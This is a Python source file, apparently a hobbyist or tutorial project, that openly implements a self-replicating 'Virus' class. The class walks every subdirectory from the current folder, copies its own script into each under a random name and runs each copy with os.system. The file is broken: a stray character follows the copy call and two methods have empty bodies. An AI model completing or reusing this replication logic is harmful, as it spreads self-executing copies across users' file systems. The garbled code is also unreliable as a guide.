import os
import shutil 
#shutil is used to copy the content
import random

#Intialize 
class Virus:
    
    def __init__(self, path=None, target_dir=None, repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
        
 # To get the path
        
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        
        for file in current_dir:
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
#Make new file 
   
    def new_virus(self):
        for directory in self.target_dir:
            n = random.randint(0,10)
            new_script="Virus"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination)s
            os.system(new_script + " 1")
#Replcate   
    def replicate(self):
      
                        
    def Virus_action(self):
      
        
        
                        
if __name__=="__main__":
    current_directory = os.path.abspath("")
    Virus = Virus(path=current_directory)
    Virus.Virus_action()
